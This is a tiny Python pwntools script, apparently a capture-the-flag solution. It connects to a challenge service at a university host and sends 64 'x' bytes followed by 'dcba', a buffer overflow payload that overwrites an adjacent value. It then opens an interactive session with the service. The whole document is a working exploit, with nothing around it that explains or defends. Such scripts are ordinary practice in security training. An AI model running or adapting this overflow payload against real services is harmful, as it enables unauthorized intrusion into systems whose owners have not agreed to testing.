from pwn import *

s =  remote('mustard.stt.rnl.tecnico.ulisboa.pt', 23152)

print(s.recvline())

s.sendline("x"*0x40+"dcba")

s.interactive()
